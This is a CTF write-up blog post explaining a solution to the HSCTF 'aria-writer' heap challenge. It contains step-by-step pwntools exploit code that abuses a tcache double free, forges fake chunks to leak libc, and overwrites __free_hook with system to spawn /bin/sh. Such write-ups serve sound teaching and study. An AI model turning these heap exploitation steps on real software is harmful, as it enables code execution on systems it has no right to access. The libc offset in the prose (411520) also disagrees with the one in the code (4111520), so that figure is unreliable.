---
layout: post
title: aria-writer
category: CTF
---
Aria-writer was a heap exploitation challenge from [HSCTF](https://ctf.hsctf.com). In this post I will describe how i developed my solution to aria-writer. If you just want to have a look at my solution the binary and exploit code is available on my [github](https://github.com/pingop/ctf/tree/master/hsctf/aria-writer).

To begin with I would like to give a small disclaimer. I am not as of yet a heap exploitation expert. If I have made a mistake somewhere I welcome any corrections. 

I will go into as many details as I feel is necesary, but I will assume some basic knowledge about the linux heap and basic heap exploits. If you are new to heap exploits i recommend [this](https://github.com/shellphish/how2heap) resource. 

If you wish to follow along I will be using the following tools:
* Ubuntu 18 VM
* [pwndbg](https://github.com/pwndbg/pwndbg)
* [ghidra](https://ghidra-sre.org/)
* [pwntools](http://docs.pwntools.com/en/stable/)

We will be exploiting a tcache double free and crafting fake heap chunks.

## Challenge Description

In this section I will describe the functionality of the binary. The binary is compiled using libc-2.27. PIE is not enabled and there is only partial RELRO. 
I used ghidra as my decompiler, below you will find the decompiled main function. I have renamed a couple of variables but it is otherwise untouched. 


```c
void main(void)

{
  int choice;
  int letter_size;
  size_t name_length;
  int free_count;
  
  free_count = 0;
  setvbuf(stdout,(char *)0x0,2,0);
  printf("whats your name > ");
  fgets(name,200,stdin);
  name_length = strlen(name);
  if (name[(long)((int)name_length + -1)] == '\n') {
    name[(long)((int)name_length + -1)] = 0;
  }
  printf("hi %s!\n");
  while( true ) {
    while( true ) {
      while( true ) {
        prompt();
        choice = get_int();
        if (choice != 2) break;
        if (7 < free_count) {
          puts("why r u so indecisive...");
          exit(0);
        }
        free_count = free_count + 1;
        puts("ok that letter was bad anyways...");
        free(letter_p);
      }
      if (choice != 3) break;
      printf("secret name o: :");
      write(1,name,200);
      putchar(10);
    }
    if (choice != 1) {
      puts("That\'s not a choice! :(");
      exit(0);
    }
    puts("how long should it be? ");
    letter_size = get_int();
    if (letter_size < 1) {
      puts("omggg haxor!1!");
      exit(0);
    }
    if (0x1a4 < letter_size) break;
    letter_p = (char *)malloc((long)letter_size);
    printf("what should i write tho > ");
    fgets(letter_p,letter_size,stdin);
  }
  puts("i can\'t write that much :/");
  exit(0);
}

```
There are two global variables, both of which will be important later. The name variable stores a string that the program reads from stdin to begin with. letter_p stores a pointer to a heap chunk which is used to store the letter we are currently writing. In the main loop we can continuously choose between 3 option:
1. Write a letter of size <= 0x1a4. The letter will be allocated on the heap and its pointer stored in letter_p
2. Delete the current letter. This will cause free to be called on letter_p. We are only allowed to delete the letter 7 times.
3. Print 200 bytes from name. Note that this is a pure write so it will not stop at nullbytes. 

The program is vulnerable to a double free. letter_p is not cleared after it is freed once, so we can call free again on the same pointer. 

## Exploit Summary

The program is vulnerable to a double free, but we cannot perform any operations on the heap chunk in-between the two calls to free. We can only print data or allocate a new chunk, but this would change letter_p and we would not be able to free the same pointer again. Fortunately since all chunks are <= 0x1a4 and the upper bound for tcache is 0x410 free chunks will be put into a tcache bin. In libc-2.27 there are no double free checks for tcache chunks, and as we shell see this makes it possible to exploit a pure double free. 

Using the double free vulnerability we can trick malloc into returning a pointer of our choosing. Furthermore the functionality of the program allows us to write data at that address. i.e. we have a write primitive, but before we can do anything useful we need to bypass ASLR. This can be accomplished by filling the tcache, creating a fake chunk in the name buffer and freeing the fake chunk. If the fake chunk does not end up in a fastbin there will be a libc pointer (inside main arena) in the chunk when freed. We can then use option 3 to print the name buffer and get an address in libc. Finally we can use our write primitive to overwrite __free_hook or a .got entry with the address of system. 

The following sections will describe these steps in detail. 


## Exploit Details 

While developing the exploit we will be extending the following python script:

```py
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template aria-writer                                                                            
from pwn import *
import os

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./aria-writer')

libc = exe.libc

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('pwn.hsctf.com', 2222)
    else:
        return process([exe.path] + argv, *a, **kw)

env = dict(os.environ)

gdbscript = '''
continue
'''.format(**locals())

io = start(env=env)

def malloc(size, content):
    io.sendlineafter('Gimme int pls > ', '1')
    io.sendlineafter('Gimme int pls > ', str(size))
    io.sendlineafter('what should i write tho > ', content)

def free():
    io.sendlineafter('Gimme int pls >', '2')

def secret_name():
    io.sendlineafter('Gimme int pls >', '3')

```

### Tcache Double Free

We will use the following python snippet to demonstrate the double free vulnerability.

```py
io.sendlineafter('whats your name > ', 'A'*8)

malloc(0x88, 'B'*8)
free()
free()

malloc(0x88, 'ABCDEFGH')
malloc(0x88, 'C'*8)
malloc(0x88, 'D'*8)

io.interactive()
```
After the second free we can inspect the heap in pwndbg to confirm that the same chunk has indeed been freed twice as shown in the first image below. The second image shows the bins after the first malloc where we see that the address 'ABCDEFGH' has been inserted into the tcache free list as expected. 
\\
![](/assets/screens/aria-writer/1.png)![](/assets/screens/aria-writer/2.png)

The above example works as follows: first we free the same chunk twice resulting in two identical chunks in the 0x90 tcache bin. We then call malloc and get one of these free chunks in a LIFO manner. We write ABCDEFGH into the user data part of the chunk, but this space is used to store the next pointer of free tcache chunks. When we call malloc again the same chunk is returned, this time with a fake next pointer value. Malloc now thinks that there is another chunk in the bin with the address ABCDEFGH. This means that the third malloc will return the pointer ABCDEFGH. 

The next step is to confirm our write primitive. We will do this by modifying the name buffer. Since PIE is not enabled the address of name can be found by inspecting the decompiled code in ghidra or your favorite disassembler. In this case the address is 0x6020e0. We can change our code to the following and see that name now contains the string "TEST".

```py
name_p = 0x6020e0

io.sendlineafter('whats your name > ', 'A'*8)

malloc(0x88, 'B'*8)
free()
free()

malloc(0x88, p64(name_p))
malloc(0x88, 'C'*8)
malloc(0x88, 'TEST\x00')

io.interactive()
```

![](/assets/screens/aria-writer/write_name.png)


### Leaking libc

In order for a libc pointer to be present in our fake chunk after we free it, several conditions must hold:
 1. tcache must be full
 2. size must be larger than maximum fastbin size (0x80)
 3. surrounding chunks must appear allocated to avoid consolidation.
 4. the next chunks prev_size field must be consistent with the size of the fake chunk.
 5. PREV_INUSE bit should be set for the next chunk
 
**1**

This is already true in the example above. After the third malloc we have alloced 3 chunks from a list containing two chunks, so the size of the relevant tcache bin has underflowed to a large number. As a result the bin appears full.

![](/assets/screens/aria-writer/full_tcache.png)

**2**

If we want to control the size field of the fake chunk we have to trick malloc into returning a pointer 16 bytes inside the name buffer since the first 16 bytes of a chunk contains metadata. In this case we actually only need to control the 8 bytes corresponding to the size filed, but libc enforces 16 byte alignment of chunks. This can be easily achieved by adding 16 to name_p and returning that pointer instead. 

Since we control all values in the fake chunk it is trivial to choose a size larger than 0x80, but we also have to fall into the range of the tcache bin that we have filled. Due to condidions 3,4 and 5 we also have to create two additional fake chunks in the name buffer and we are restricted to 200 bytes. This leads us to the choice of 0x90 as the size of the fake chunk.

```py
name_p = 0x6020e0
fake_chunk_p = name_p + 16

fake_chunk = fit({
    0x8: 0x90,
}, fill='\x00', length=0xc8)
```

**3**

To avoid consolidation of our chunk we need to trick free into thinking that surrounding chunks are allocated. Avoiding consolidation with the previous chunk is simple we just set the PREV_INUSE bit of our fake chunk. i.e. we change the size field to 0x91. In order to avoid consolidation with the next chunk we must set the PREV_INUSE bit of the chunk after the next chunk. We fake another two chunks which are small enought to fit into our buffer, the minimum size is 0x10 so we create two such chunks at offset 0x90 in the fake chunk.
```py
fake_chunk = fit({
    0x8: 0x91,
	0x98: 0x10,
	0xa8: 0x11,
}, fill='\x00', length=0xc8)
```
**4 + 5**

The above chunk will still not work since free detects that the PREV_INUSE bit is not set for the next chunk. So we also make sure that field is set. Furthermore free detects a mismatch between the size of our fake chunk size and prev_size of the next chunk, so we also set this to 0x90. After these modifications we have crafted a valid chunk that will not be put in tcache or fastbins. The following code will free the fake chunk and print the name buffer.

```py
name_p = 0x6020e0
fake_chunk_p = name_p + 16

fake_chunk = fit({
    0x8: 0x91,
    0x90: 0x90,
    0x98: 0x11,
    0xa8: 0x11,
}, filler='\x00', length=0xc8)

io.sendafter('whats your name > ', fake_chunk)

malloc(0x88, 'B'*8)
free()
free()

malloc(0x88, p64(fake_chunk_p))
malloc(0x88, 'C'*8)
malloc(0x88, 'TEST\x00')
free()

secret_name()
io.interactive()
```
output:

![](/assets/screens/aria-writer/print_secret_name.png)

The highlighted text is an address in libc it is easy to find the offset from libc base, just run the code with pwndbg, use the vmmap command to get the currrent libc base address and substract that value from the leaked address. In this case the offset is 411520. We can now leak libc using the following code snippet:

```py
secret_name()
io.recvuntil('secret name o: :')
io.read(16)
leak = u64(io.read(8))
libc_addr = leak - 4111520
libc.address = libc_addr

log.success('libc @ %#x' % libc.address)

io.interactive()
```

### Getting code execution

From here it is easy to gain code execution. We use the same double free trick (with a different size) to overwrite __free_hook with the address of system. Since the free hook is called with the same arguments as free we can just malloc a chunk with the string /bin/sh and call free again. Adding the following lines of code we have a working exploit:

```py
malloc(0x68, 'A')
free()
free()

malloc(0x68, flat(libc.symbols['__free_hook']))
malloc(0x68, 'B*8')
malloc(0x68, flat(libc.symbols['system']))

malloc(0x58, '/bin/sh\x00')
free()

io.interactive()
```

![](/assets/screens/aria-writer/shell.png)

 

